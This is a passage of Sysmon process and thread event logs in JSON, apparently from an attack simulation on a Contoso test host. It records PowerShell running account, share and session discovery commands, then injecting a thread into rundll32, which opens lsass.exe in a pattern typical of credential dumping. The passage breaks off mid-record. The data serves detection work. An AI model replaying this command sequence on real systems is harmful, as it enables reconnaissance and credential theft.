        {
            "action": "create",
            "command_line": "C:\\windows\\system32\\net1  user",
            "event_id": "b425a92b3857a041f86ca213a10a780cf7bd1578b55c83112f6ed0a156ff61b5",
            "event_type": "process",
            "event_utc": "2020-09-24T18:26:50.476Z",
            "exe": "net1.exe",
            "fqdn": "cmp-535872.contoso.org",
            "hash": {
                "MD5": "9C911EE188F19891CD6BFFB67D0E3904",
                "SHA256": "524061B58841210842F52B7863E51953FCFF343B8C2FF46DFE9C8329BB439D46"
            },
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "b425a92b3857a041f86ca213a10a780cf7bd1578b55c83112f6ed0a156ff61b5",
            "image_path": "C:\\Windows\\SysWOW64\\net1.exe",
            "integrity_level": "High",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "logon_guid": "{E0425724-A193-46EB-8062-B64C378337CC}",
            "logon_id": "0xf28ca3",
            "nodetype": "event",
            "object": "process",
            "original_file_name": "net1.exe",
            "parent_command_line": "net  user",
            "parent_exe": "net.exe",
            "parent_image_path": "C:\\Windows\\SysWOW64\\net.exe",
            "parent_process_guid": "{DD483508-E4EA-5F6C-0000-001078C53001}",
            "pid": 2172,
            "ppid": 3184,
            "process_guid": "{DD483508-E4EA-5F6C-0000-0010D2CB3001}",
            "record_number": "4097615",
            "subtype": "create",
            "terminal_session_id": "1",
            "time": "2020-09-24T18:26:50.478Z",
            "timestamp": 1600972010478,
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-E4EA-5F6C-0000-0010D2CB3001}"
        },
        {
            "action": "terminate",
            "event_id": "1a805dacf7b47447665681049ae9c30d4a61b2d5b1608e50a232fb807edaaebe",
            "event_type": "process",
            "event_utc": "2020-09-24T18:26:50.582Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "1a805dacf7b47447665681049ae9c30d4a61b2d5b1608e50a232fb807edaaebe",
            "image_path": "C:\\Windows\\SysWOW64\\cmd.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "process",
            "pid": 1668,
            "process_guid": "{DD483508-E4EA-5F6C-0000-001090B83001}",
            "record_number": "4097616",
            "subtype": "terminate",
            "time": "2020-09-24T18:26:50.589Z",
            "timestamp": 1600972010589,
            "uuid": "{DD483508-E4EA-5F6C-0000-001090B83001}"
        },
        {
            "action": "create",
            "command_line": "C:\\windows\\system32\\cmd.exe /C net share",
            "event_id": "ad86f664bba0f0f7f831070acc408147e3650f680514e2d74cb6485d01687f94",
            "event_type": "process",
            "event_utc": "2020-09-24T18:26:56.826Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "hash": {
                "MD5": "8FAFBE3C23E2BE4D6A3C063118B9A4F2",
                "SHA256": "4C3EA4C44AAB74350355C419826B8C9E6172C3BD8F0BB5817ECF7BE50B629051"
            },
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "ad86f664bba0f0f7f831070acc408147e3650f680514e2d74cb6485d01687f94",
            "image_path": "C:\\Windows\\SysWOW64\\cmd.exe",
            "integrity_level": "High",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "logon_guid": "{E0425724-A193-46EB-8062-B64C378337CC}",
            "logon_id": "0xf28ca3",
            "nodetype": "event",
            "object": "process",
            "original_file_name": "Cmd.Exe",
            "parent_command_line": "\"c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe\" -Version 5.1 -s -NoLogo -NoProfile",
            "parent_exe": "powershell.exe",
            "parent_image_path": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
            "parent_process_guid": "{DD483508-E26C-5F6C-0000-0010E0300501}",
            "pid": 6348,
            "ppid": 3544,
            "process_guid": "{DD483508-E4F0-5F6C-0000-001084B23101}",
            "record_number": "4097624",
            "subtype": "create",
            "terminal_session_id": "1",
            "time": "2020-09-24T18:26:56.834Z",
            "timestamp": 1600972016834,
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-E4F0-5F6C-0000-001084B23101}"
        },
        {
            "action": "access",
            "call_trace": "C:\\windows\\SYSTEM32\\ntdll.dll+a18c4|C:\\windows\\System32\\wow64.dll+14591|C:\\windows\\System32\\wow64.dll+13d83|C:\\windows\\System32\\wow64.dll+6523|C:\\windows\\System32\\wow64cpu.dll+1923|C:\\windows\\System32\\wow64.dll+1aefc|C:\\windows\\System32\\wow64.dll+bea0|C:\\windows\\SYSTEM32\\ntdll.dll+792b8|C:\\windows\\SYSTEM32\\ntdll.dll+78e3b|C:\\windows\\SYSTEM32\\ntdll.dll+78dee|C:\\windows\\SYSTEM32\\ntdll.dll+702fc(wow64)|C:\\windows\\System32\\KERNELBASE.dll+d3a96(wow64)|C:\\windows\\System32\\KERNELBASE.dll+189dbb(wow64)|C:\\windows\\System32\\KERNELBASE.dll+189a6c(wow64)|C:\\Program Files\\Windows Event Reporting\\Core\\EventReporting.ApplicationFilter.Monitor.Win32.dll+31c2(wow64)|UNKNOWN(0000000071971000)|UNKNOWN(000000000C6064BB)|UNKNOWN(000000000C6065D3)|UNKNOWN(000000000C60672B)|UNKNOWN(000000000C601965)|UNKNOWN(000000000C601A87)|UNKNOWN(000000000C6071CC)|UNKNOWN(000000000C600506)|UNKNOWN(000000000C6078A8)",
            "event_id": "a695157dc7ec7f09a2d76ac2e5ca1b0ba57e918146f3aca7edd5c248fc441c9c",
            "event_type": "process",
            "event_utc": "2020-09-24T18:26:56.816Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "granted_access": "0x1fffff",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "a695157dc7ec7f09a2d76ac2e5ca1b0ba57e918146f3aca7edd5c248fc441c9c",
            "image_path": "C:\\windows\\SysWOW64\\cmd.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "process",
            "pid": 6348,
            "process_guid": "{DD483508-E4F0-5F6C-0000-001084B23101}",
            "record_number": "4097625",
            "src_exe": "powershell.exe",
            "src_image_path": "c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe",
            "src_pid": "3544",
            "src_process_guid": "{DD483508-E26C-5F6C-0000-0010E0300501}",
            "subtype": "access",
            "time": "2020-09-24T18:26:56.835Z",
            "timestamp": 1600972016835,
            "uuid": "{DD483508-E4F0-5F6C-0000-001084B23101}"
        },
        {
            "action": "create",
            "command_line": "net  share",
            "event_id": "7d1e0676430bba6d3e464c065bf84014bf9199188d64542e67586d75c1e08c34",
            "event_type": "process",
            "event_utc": "2020-09-24T18:26:56.998Z",
            "exe": "net.exe",
            "fqdn": "cmp-535872.contoso.org",
            "hash": {
                "MD5": "8055B288B1F39855014A68BEC31D8E6D",
                "SHA256": "08F791037FD70209FD599C4F35088A7332DADFA6BE92D073C243C5CC79FEFE66"
            },
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "7d1e0676430bba6d3e464c065bf84014bf9199188d64542e67586d75c1e08c34",
            "image_path": "C:\\Windows\\SysWOW64\\net.exe",
            "integrity_level": "High",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "logon_guid": "{E0425724-A193-46EB-8062-B64C378337CC}",
            "logon_id": "0xf28ca3",
            "nodetype": "event",
            "object": "process",
            "original_file_name": "net.exe",
            "parent_command_line": "C:\\windows\\system32\\cmd.exe /C net share",
            "parent_exe": "cmd.exe",
            "parent_image_path": "C:\\Windows\\SysWOW64\\cmd.exe",
            "parent_process_guid": "{DD483508-E4F0-5F6C-0000-001084B23101}",
            "pid": 9524,
            "ppid": 6348,
            "process_guid": "{DD483508-E4F0-5F6C-0000-001095BF3101}",
            "record_number": "4097626",
            "subtype": "create",
            "terminal_session_id": "1",
            "time": "2020-09-24T18:26:57.000Z",
            "timestamp": 1600972017000,
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-E4F0-5F6C-0000-001095BF3101}"
        },
        {
            "action": "create",
            "command_line": "C:\\windows\\system32\\net1  share",
            "event_id": "15983d181d9e547b7bd38a6aa98101f9fbc511dfbf2732a30262c9ceec65d512",
            "event_type": "process",
            "event_utc": "2020-09-24T18:26:57.045Z",
            "exe": "net1.exe",
            "fqdn": "cmp-535872.contoso.org",
            "hash": {
                "MD5": "9C911EE188F19891CD6BFFB67D0E3904",
                "SHA256": "524061B58841210842F52B7863E51953FCFF343B8C2FF46DFE9C8329BB439D46"
            },
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "15983d181d9e547b7bd38a6aa98101f9fbc511dfbf2732a30262c9ceec65d512",
            "image_path": "C:\\Windows\\SysWOW64\\net1.exe",
            "integrity_level": "High",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "logon_guid": "{E0425724-A193-46EB-8062-B64C378337CC}",
            "logon_id": "0xf28ca3",
            "nodetype": "event",
            "object": "process",
            "original_file_name": "net1.exe",
            "parent_command_line": "net  share",
            "parent_exe": "net.exe",
            "parent_image_path": "C:\\Windows\\SysWOW64\\net.exe",
            "parent_process_guid": "{DD483508-E4F0-5F6C-0000-001095BF3101}",
            "pid": 2940,
            "ppid": 9524,
            "process_guid": "{DD483508-E4F1-5F6C-0000-00104FC63101}",
            "record_number": "4097627",
            "subtype": "create",
            "terminal_session_id": "1",
            "time": "2020-09-24T18:26:57.047Z",
            "timestamp": 1600972017047,
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-E4F1-5F6C-0000-00104FC63101}"
        },
        {
            "action": "terminate",
            "event_id": "739d4e1fea3b0ae555a8aa3c396b05299c08128bf880b9ab72cf272d91c6b02f",
            "event_type": "process",
            "event_utc": "2020-09-24T18:26:57.160Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "739d4e1fea3b0ae555a8aa3c396b05299c08128bf880b9ab72cf272d91c6b02f",
            "image_path": "C:\\Windows\\SysWOW64\\cmd.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "process",
            "pid": 6348,
            "process_guid": "{DD483508-E4F0-5F6C-0000-001084B23101}",
            "record_number": "4097628",
            "subtype": "terminate",
            "time": "2020-09-24T18:26:57.160Z",
            "timestamp": 1600972017160,
            "uuid": "{DD483508-E4F0-5F6C-0000-001084B23101}"
        },
        {
            "action": "create",
            "command_line": "C:\\windows\\system32\\cmd.exe /C net session",
            "event_id": "63b184e4475e5a5ee2d461b56a051d7e991f22c30553a33b354edf2c47e493ba",
            "event_type": "process",
            "event_utc": "2020-09-24T18:27:04.306Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "hash": {
                "MD5": "8FAFBE3C23E2BE4D6A3C063118B9A4F2",
                "SHA256": "4C3EA4C44AAB74350355C419826B8C9E6172C3BD8F0BB5817ECF7BE50B629051"
            },
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "63b184e4475e5a5ee2d461b56a051d7e991f22c30553a33b354edf2c47e493ba",
            "image_path": "C:\\Windows\\SysWOW64\\cmd.exe",
            "integrity_level": "High",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "logon_guid": "{E0425724-A193-46EB-8062-B64C378337CC}",
            "logon_id": "0xf28ca3",
            "nodetype": "event",
            "object": "process",
            "original_file_name": "Cmd.Exe",
            "parent_command_line": "\"c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe\" -Version 5.1 -s -NoLogo -NoProfile",
            "parent_exe": "powershell.exe",
            "parent_image_path": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
            "parent_process_guid": "{DD483508-E26C-5F6C-0000-0010E0300501}",
            "pid": 5472,
            "ppid": 3544,
            "process_guid": "{DD483508-E4F8-5F6C-0000-00107ED43201}",
            "record_number": "4097642",
            "subtype": "create",
            "terminal_session_id": "1",
            "time": "2020-09-24T18:27:04.314Z",
            "timestamp": 1600972024314,
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-E4F8-5F6C-0000-00107ED43201}"
        },
        {
            "action": "access",
            "call_trace": "C:\\windows\\SYSTEM32\\ntdll.dll+a18c4|C:\\windows\\System32\\wow64.dll+14591|C:\\windows\\System32\\wow64.dll+13d83|C:\\windows\\System32\\wow64.dll+6523|C:\\windows\\System32\\wow64cpu.dll+1923|C:\\windows\\System32\\wow64.dll+1aefc|C:\\windows\\System32\\wow64.dll+bea0|C:\\windows\\SYSTEM32\\ntdll.dll+792b8|C:\\windows\\SYSTEM32\\ntdll.dll+78e3b|C:\\windows\\SYSTEM32\\ntdll.dll+78dee|C:\\windows\\SYSTEM32\\ntdll.dll+702fc(wow64)|C:\\windows\\System32\\KERNELBASE.dll+d3a96(wow64)|C:\\windows\\System32\\KERNELBASE.dll+189dbb(wow64)|C:\\windows\\System32\\KERNELBASE.dll+189a6c(wow64)|C:\\Program Files\\Windows Event Reporting\\Core\\EventReporting.ApplicationFilter.Monitor.Win32.dll+31c2(wow64)|UNKNOWN(0000000071971000)|UNKNOWN(000000000C6064BB)|UNKNOWN(000000000C6065D3)|UNKNOWN(000000000C60672B)|UNKNOWN(000000000C601965)|UNKNOWN(000000000C601A87)|UNKNOWN(000000000C6071CC)|UNKNOWN(000000000C600506)|UNKNOWN(000000000C6078A8)",
            "event_id": "93e53c2d8739772dc9ec24b820998e8ee7a0d70eb3334836948b66aa97f0ee1c",
            "event_type": "process",
            "event_utc": "2020-09-24T18:27:04.300Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "granted_access": "0x1fffff",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "93e53c2d8739772dc9ec24b820998e8ee7a0d70eb3334836948b66aa97f0ee1c",
            "image_path": "C:\\windows\\SysWOW64\\cmd.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "process",
            "pid": 5472,
            "process_guid": "{DD483508-E4F8-5F6C-0000-00107ED43201}",
            "record_number": "4097643",
            "src_exe": "powershell.exe",
            "src_image_path": "c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe",
            "src_pid": "3544",
            "src_process_guid": "{DD483508-E26C-5F6C-0000-0010E0300501}",
            "subtype": "access",
            "time": "2020-09-24T18:27:04.315Z",
            "timestamp": 1600972024315,
            "uuid": "{DD483508-E4F8-5F6C-0000-00107ED43201}"
        },
        {
            "action": "create",
            "command_line": "net  session",
            "event_id": "9686fd05e0f74669e87720bfb0072fdaabbb335e44fd3efff3fb887eb98256b1",
            "event_type": "process",
            "event_utc": "2020-09-24T18:27:04.471Z",
            "exe": "net.exe",
            "fqdn": "cmp-535872.contoso.org",
            "hash": {
                "MD5": "8055B288B1F39855014A68BEC31D8E6D",
                "SHA256": "08F791037FD70209FD599C4F35088A7332DADFA6BE92D073C243C5CC79FEFE66"
            },
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "9686fd05e0f74669e87720bfb0072fdaabbb335e44fd3efff3fb887eb98256b1",
            "image_path": "C:\\Windows\\SysWOW64\\net.exe",
            "integrity_level": "High",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "logon_guid": "{E0425724-A193-46EB-8062-B64C378337CC}",
            "logon_id": "0xf28ca3",
            "nodetype": "event",
            "object": "process",
            "original_file_name": "net.exe",
            "parent_command_line": "C:\\windows\\system32\\cmd.exe /C net session",
            "parent_exe": "cmd.exe",
            "parent_image_path": "C:\\Windows\\SysWOW64\\cmd.exe",
            "parent_process_guid": "{DD483508-E4F8-5F6C-0000-00107ED43201}",
            "pid": 8852,
            "ppid": 5472,
            "process_guid": "{DD483508-E4F8-5F6C-0000-00106CE13201}",
            "record_number": "4097644",
            "subtype": "create",
            "terminal_session_id": "1",
            "time": "2020-09-24T18:27:04.473Z",
            "timestamp": 1600972024473,
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-E4F8-5F6C-0000-00106CE13201}"
        },
        {
            "action": "create",
            "command_line": "C:\\windows\\system32\\net1  session",
            "event_id": "63cba4ac647804abc9e6912cf384b59c9a245067a54b5f20f9a340670d3caf74",
            "event_type": "process",
            "event_utc": "2020-09-24T18:27:04.517Z",
            "exe": "net1.exe",
            "fqdn": "cmp-535872.contoso.org",
            "hash": {
                "MD5": "9C911EE188F19891CD6BFFB67D0E3904",
                "SHA256": "524061B58841210842F52B7863E51953FCFF343B8C2FF46DFE9C8329BB439D46"
            },
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "63cba4ac647804abc9e6912cf384b59c9a245067a54b5f20f9a340670d3caf74",
            "image_path": "C:\\Windows\\SysWOW64\\net1.exe",
            "integrity_level": "High",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "logon_guid": "{E0425724-A193-46EB-8062-B64C378337CC}",
            "logon_id": "0xf28ca3",
            "nodetype": "event",
            "object": "process",
            "original_file_name": "net1.exe",
            "parent_command_line": "net  session",
            "parent_exe": "net.exe",
            "parent_image_path": "C:\\Windows\\SysWOW64\\net.exe",
            "parent_process_guid": "{DD483508-E4F8-5F6C-0000-00106CE13201}",
            "pid": 8432,
            "ppid": 8852,
            "process_guid": "{DD483508-E4F8-5F6C-0000-0010C6E73201}",
            "record_number": "4097645",
            "subtype": "create",
            "terminal_session_id": "1",
            "time": "2020-09-24T18:27:04.519Z",
            "timestamp": 1600972024519,
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-E4F8-5F6C-0000-0010C6E73201}"
        },
        {
            "action": "terminate",
            "event_id": "c97dbb3cf5112644b0b03b5889f40977742c5928ae095fb07c743bb0131a73a7",
            "event_type": "process",
            "event_utc": "2020-09-24T18:27:04.613Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "c97dbb3cf5112644b0b03b5889f40977742c5928ae095fb07c743bb0131a73a7",
            "image_path": "C:\\Windows\\SysWOW64\\cmd.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "process",
            "pid": 5472,
            "process_guid": "{DD483508-E4F8-5F6C-0000-00107ED43201}",
            "record_number": "4097646",
            "subtype": "terminate",
            "time": "2020-09-24T18:27:04.624Z",
            "timestamp": 1600972024624,
            "uuid": "{DD483508-E4F8-5F6C-0000-00107ED43201}"
        },
        {
            "action": "create",
            "command_line": "C:\\windows\\system32\\cmd.exe /C query user",
            "event_id": "1814111e49cb0e9469fade893a5477cca432cf6e5a624a74c85d1b4bf62352ce",
            "event_type": "process",
            "event_utc": "2020-09-24T18:27:10.178Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "hash": {
                "MD5": "8FAFBE3C23E2BE4D6A3C063118B9A4F2",
                "SHA256": "4C3EA4C44AAB74350355C419826B8C9E6172C3BD8F0BB5817ECF7BE50B629051"
            },
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "1814111e49cb0e9469fade893a5477cca432cf6e5a624a74c85d1b4bf62352ce",
            "image_path": "C:\\Windows\\SysWOW64\\cmd.exe",
            "integrity_level": "High",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "logon_guid": "{E0425724-A193-46EB-8062-B64C378337CC}",
            "logon_id": "0xf28ca3",
            "nodetype": "event",
            "object": "process",
            "original_file_name": "Cmd.Exe",
            "parent_command_line": "\"c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe\" -Version 5.1 -s -NoLogo -NoProfile",
            "parent_exe": "powershell.exe",
            "parent_image_path": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
            "parent_process_guid": "{DD483508-E26C-5F6C-0000-0010E0300501}",
            "pid": 584,
            "ppid": 3544,
            "process_guid": "{DD483508-E4FE-5F6C-0000-001000F23201}",
            "record_number": "4097651",
            "subtype": "create",
            "terminal_session_id": "1",
            "time": "2020-09-24T18:27:10.186Z",
            "timestamp": 1600972030186,
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-E4FE-5F6C-0000-001000F23201}"
        },
        {
            "action": "access",
            "call_trace": "C:\\windows\\SYSTEM32\\ntdll.dll+a18c4|C:\\windows\\System32\\wow64.dll+14591|C:\\windows\\System32\\wow64.dll+13d83|C:\\windows\\System32\\wow64.dll+6523|C:\\windows\\System32\\wow64cpu.dll+1923|C:\\windows\\System32\\wow64.dll+1aefc|C:\\windows\\System32\\wow64.dll+bea0|C:\\windows\\SYSTEM32\\ntdll.dll+792b8|C:\\windows\\SYSTEM32\\ntdll.dll+78e3b|C:\\windows\\SYSTEM32\\ntdll.dll+78dee|C:\\windows\\SYSTEM32\\ntdll.dll+702fc(wow64)|C:\\windows\\System32\\KERNELBASE.dll+d3a96(wow64)|C:\\windows\\System32\\KERNELBASE.dll+189dbb(wow64)|C:\\windows\\System32\\KERNELBASE.dll+189a6c(wow64)|C:\\Program Files\\Windows Event Reporting\\Core\\EventReporting.ApplicationFilter.Monitor.Win32.dll+31c2(wow64)|UNKNOWN(0000000071971000)|UNKNOWN(000000000C6064BB)|UNKNOWN(000000000C6065D3)|UNKNOWN(000000000C60672B)|UNKNOWN(000000000C601965)|UNKNOWN(000000000C601A87)|UNKNOWN(000000000C6071CC)|UNKNOWN(000000000C600506)|UNKNOWN(000000000C6078A8)",
            "event_id": "52a397d0824a07f73df5a9e63944487e5576446d37fd6f631370e617853b2aec",
            "event_type": "process",
            "event_utc": "2020-09-24T18:27:10.175Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "granted_access": "0x1fffff",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "52a397d0824a07f73df5a9e63944487e5576446d37fd6f631370e617853b2aec",
            "image_path": "C:\\windows\\SysWOW64\\cmd.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "process",
            "pid": 584,
            "process_guid": "{DD483508-E4FE-5F6C-0000-001000F23201}",
            "record_number": "4097652",
            "src_exe": "powershell.exe",
            "src_image_path": "c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe",
            "src_pid": "3544",
            "src_process_guid": "{DD483508-E26C-5F6C-0000-0010E0300501}",
            "subtype": "access",
            "time": "2020-09-24T18:27:10.187Z",
            "timestamp": 1600972030187,
            "uuid": "{DD483508-E4FE-5F6C-0000-001000F23201}"
        },
        {
            "action": "terminate",
            "event_id": "3cf36f821c1f080e7103ff069c1cbe88a8c2ca9c3beb36313ee796356c6b6f4e",
            "event_type": "process",
            "event_utc": "2020-09-24T18:27:10.363Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "3cf36f821c1f080e7103ff069c1cbe88a8c2ca9c3beb36313ee796356c6b6f4e",
            "image_path": "C:\\Windows\\SysWOW64\\cmd.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "process",
            "pid": 584,
            "process_guid": "{DD483508-E4FE-5F6C-0000-001000F23201}",
            "record_number": "4097653",
            "subtype": "terminate",
            "time": "2020-09-24T18:27:10.365Z",
            "timestamp": 1600972030365,
            "uuid": "{DD483508-E4FE-5F6C-0000-001000F23201}"
        },
        {
            "action": "create",
            "command_line": "C:\\windows\\sysnative\\rundll32.exe",
            "event_id": "2aff1ef3fca1c272cca4f4dd2b7eeffdedeee55dd2111df6557dc73dcdedb62e",
            "event_type": "process",
            "event_utc": "2020-09-24T18:36:37.230Z",
            "exe": "rundll32.exe",
            "fqdn": "cmp-535872.contoso.org",
            "hash": {
                "MD5": "731A783A36A8E69A6434D19D98B12A09",
                "SHA256": "B1E6A7A3E2597E51836277A32B2BC61AA781C8F681D44DFDDEA618B32E2BF2A6"
            },
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "2aff1ef3fca1c272cca4f4dd2b7eeffdedeee55dd2111df6557dc73dcdedb62e",
            "image_path": "C:\\Windows\\System32\\rundll32.exe",
            "integrity_level": "High",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "logon_guid": "{E0425724-A193-46EB-8062-B64C378337CC}",
            "logon_id": "0xf28ca3",
            "nodetype": "event",
            "object": "process",
            "original_file_name": "RUNDLL32.EXE",
            "parent_command_line": "\"c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe\" -Version 5.1 -s -NoLogo -NoProfile",
            "parent_exe": "powershell.exe",
            "parent_image_path": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
            "parent_process_guid": "{DD483508-E26C-5F6C-0000-0010E0300501}",
            "pid": 8064,
            "ppid": 3544,
            "process_guid": "{DD483508-E735-5F6C-0000-0010A0755501}",
            "record_number": "4097802",
            "subtype": "create",
            "terminal_session_id": "1",
            "time": "2020-09-24T18:36:37.236Z",
            "timestamp": 1600972597236,
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-E735-5F6C-0000-0010A0755501}"
        },
        {
            "action": "access",
            "call_trace": "C:\\windows\\SYSTEM32\\ntdll.dll+a18c4|C:\\windows\\System32\\wow64.dll+14591|C:\\windows\\System32\\wow64.dll+13d83|C:\\windows\\System32\\wow64.dll+6523|C:\\windows\\System32\\wow64cpu.dll+1923|C:\\windows\\System32\\wow64.dll+1aefc|C:\\windows\\System32\\wow64.dll+bea0|C:\\windows\\SYSTEM32\\ntdll.dll+792b8|C:\\windows\\SYSTEM32\\ntdll.dll+78e3b|C:\\windows\\SYSTEM32\\ntdll.dll+78dee|C:\\windows\\SYSTEM32\\ntdll.dll+702fc(wow64)|C:\\windows\\System32\\KERNELBASE.dll+d3a96(wow64)|C:\\windows\\System32\\KERNELBASE.dll+189dbb(wow64)|C:\\windows\\System32\\KERNELBASE.dll+189a6c(wow64)|C:\\Program Files\\Windows Event Reporting\\Core\\EventReporting.ApplicationFilter.Monitor.Win32.dll+31c2(wow64)|UNKNOWN(0000000071971000)|UNKNOWN(000000000C6064BB)|UNKNOWN(000000000C6065D3)|UNKNOWN(000000000C60672B)|UNKNOWN(000000000C608A5E)|UNKNOWN(000000000C603456)|UNKNOWN(000000000C606F3A)|UNKNOWN(000000000C600506)|UNKNOWN(000000000C6078A8)",
            "event_id": "9d08c40f65690b5eff0a84cee21476766f9f818f04cb7cee791228145a065f47",
            "event_type": "process",
            "event_utc": "2020-09-24T18:36:37.224Z",
            "exe": "rundll32.exe",
            "fqdn": "cmp-535872.contoso.org",
            "granted_access": "0x1fffff",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "9d08c40f65690b5eff0a84cee21476766f9f818f04cb7cee791228145a065f47",
            "image_path": "C:\\windows\\system32\\rundll32.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "process",
            "pid": 8064,
            "process_guid": "{DD483508-E735-5F6C-0000-0010A0755501}",
            "record_number": "4097803",
            "src_exe": "powershell.exe",
            "src_image_path": "c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe",
            "src_pid": "3544",
            "src_process_guid": "{DD483508-E26C-5F6C-0000-0010E0300501}",
            "subtype": "access",
            "time": "2020-09-24T18:36:37.237Z",
            "timestamp": 1600972597237,
            "uuid": "{DD483508-E735-5F6C-0000-0010A0755501}"
        },
        {
            "action": "create",
            "event_id": "27da56cad53926a62d66c568fd329be52bc865910f19e26ffa13c6be8fd7a118",
            "event_type": "thread",
            "event_utc": "2020-09-24T18:36:37.349Z",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "27da56cad53926a62d66c568fd329be52bc865910f19e26ffa13c6be8fd7a118",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "thread",
            "record_number": "4097804",
            "src_image": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
            "src_pid": "3544",
            "src_process_guid": "{DD483508-E26C-5F6C-0000-0010E0300501}",
            "start_address": "0x00000000004B0000",
            "start_module": "%{[event_data][StartModule]}",
            "start_module_name": "%{[event_data][StartModule]}",
            "subtype": "create",
            "tgt_image": "C:\\Windows\\System32\\rundll32.exe",
            "tgt_pid": "8064",
            "tgt_process_guid": "{DD483508-E735-5F6C-0000-0010A0755501}",
            "tgt_tid": "9276",
            "time": "2020-09-24T18:36:37.351Z",
            "timestamp": 1600972597351
        },
        {
            "action": "access",
            "call_trace": "C:\\windows\\SYSTEM32\\ntdll.dll+a0574|C:\\windows\\System32\\KERNELBASE.dll+3dd5d|UNKNOWN(00000189C77CF0F5)",
            "event_id": "7c737a4bfc56ef44920c7f5e657e3a3ab450ea6eb642778e8785def9788fcdbb",
            "event_type": "process",
            "event_utc": "2020-09-24T18:36:39.411Z",
            "exe": "lsass.exe",
            "fqdn": "cmp-535872.contoso.org",
            "granted_access": "0x1010",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "7c737a4bfc56ef44920c7f5e657e3a3ab450ea6eb642778e8785def9788fcdbb",
            "image_path": "C:\\windows\\system32\\lsass.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "process",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4097808",
            "src_exe": "rundll32.exe",
            "src_image_path": "C:\\windows\\system32\\rundll32.exe",
            "src_pid": "8064",
            "src_process_guid": "{DD483508-E735-5F6C-0000-0010A0755501}",
            "subtype": "access",
            "time": "2020-09-24T18:36:39.426Z",
            "timestamp": 1600972599426,
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "create",
